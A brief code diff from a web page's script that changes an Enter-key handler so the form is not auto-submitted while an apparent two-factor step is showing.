-  if (e.key === "Enter" && !sent) form.requestSubmit();
+  if (e.key !== "Enter") return;
+  if ($("step2fa").classList.contains("on")) return;
+  if (!sent) form.requestSubmit();
 });
 </script>
 </body>
